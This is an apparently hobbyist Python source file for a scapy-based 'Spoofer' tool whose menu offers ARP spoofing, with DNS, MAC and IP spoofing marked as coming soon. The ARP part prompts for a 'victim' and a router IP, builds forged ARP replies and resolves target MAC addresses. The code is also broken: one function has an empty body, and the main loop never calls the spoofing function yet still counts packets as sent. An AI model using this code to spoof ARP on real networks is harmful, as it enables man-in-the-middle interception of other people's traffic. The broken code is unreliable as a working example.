import scapy.all as scapy
import sys
import time
import os
from colorama import init, Fore, Back, Style
import threading

def installingReq():


class loadingScreens():
    def __init__(self, choice):
        if choice == 1:
            self.initializing()

    def initializing(self):
        words = [
    "[+] Initializing",
    "[+] iNitializing",
    "[+] inItializing",
    "[+] iniTializing",
    "[+] initIalizing",
    "[+] initiAlizing",
    "[+] initiaLizing",
    "[+] initialIzing",
    "[+] initialiZing",
    "[+] initializIng",
    "[+] initializiNg",
    "[+] initializinG"
]
        for i in range(2):
            for word in words:
                print(f"\r{word}", end="")
                time.sleep(0.3)

        print("\n")

class ARP_SPOOFING:
    def __init__(self):
        vicIp, routIP = self.askInput()
        self.sentPacketCount = 0

        while True:

            self.sentPacketCount = self.sentPacketCount + 2
            print("\r[+] Packets sent: " + str(self.sentPacketCount), end="")

    def askInput(self):
        victim_ip = input("Victim IP Address: ")
        router_ip = input("Router IP Address: ")

        return victim_ip, router_ip
    
    def arpSpoof(self, target_ip, spoof_ip):
        arp_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=self.getMac(target_ip), psrc=spoof_ip) # making an ARP packet, psrc = source ip, pdst = destination ip, hwdst = destination mac
        scapy.send(arp_packet)



    def getMac(self, ip):
        arpReq = scapy.ARP(pdst=ip) # set the destination ip address to the IP address of the target
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") # set the mac address to a broadcast address
        arpReq_broadcast = broadcast/arpReq # builds the packet from left to right. Layer 2 and layer 3 respectively. 

        ans = scapy.srp(arpReq_broadcast, timeout=2, verbose=False)[0] # send the packet and get the response, waits for 2 seconds

        return ans[0][1].hwsrc

def banner():
    print("""
         _____                   ____         
        / ___/____  ____  ____  / __/__  _____
        \__ \/ __ \/ __ \/ __ \/ /_/ _ \/ ___/
         ___/ / /_/ / /_/ / /_/ / __/  __/ /    
        /____/ .___/\____/\____/_/  \___/_/     
            /_/                                 

        Author: SHAWN MICHAEL SUDARIA
        Version: 1.0
         
        """)
    
def main():
    os.system('cls||clear')
    loadingScreens(1)
    os.system('cls||clear')
    banner()
    print("""
    Choose:
          1. ARP Spoofing
          2. DNS SPoofing $(Coming Soon)
          3. MAC Address Spoofing $(Coming Soon)
          4. IP Address Spoofing $(Coming Soon)
    \n\n""") 
    choice = input(">>> ")
    if(choice == "1"):
        arpS = ARP_SPOOFING()
    elif (choice == "q" or choice == "Q" or choice == "quit" or choice == "QUIT"):
        exit()
    # arp_request = scapy.ARP(pdst=ip)    
    
if __name__ == "__main__":
   main() 
